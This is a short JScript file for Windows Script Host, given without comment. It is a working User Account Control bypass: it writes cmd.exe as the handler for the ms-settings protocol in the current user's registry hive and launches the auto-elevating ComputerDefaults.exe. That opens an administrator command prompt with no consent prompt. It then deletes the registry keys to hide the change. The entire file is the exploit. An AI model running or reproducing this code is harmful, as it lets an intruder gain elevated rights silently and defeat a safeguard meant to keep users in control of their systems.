var WshShell = new ActiveXObject("Wscript.Shell");
var myKey = "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\Command\\"
WshShell.RegWrite(myKey,"cmd.exe","REG_SZ");
myKey = "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\Command\\DelegateExecute"
WshShell.RegWrite(myKey,"","REG_SZ");
WshShell.Run("ComputerDefaults.exe");
WScript.Sleep(1000);
WshShell.RegDelete("HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\Command\\DelegateExecute");
WshShell.RegDelete("HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\Command\\");
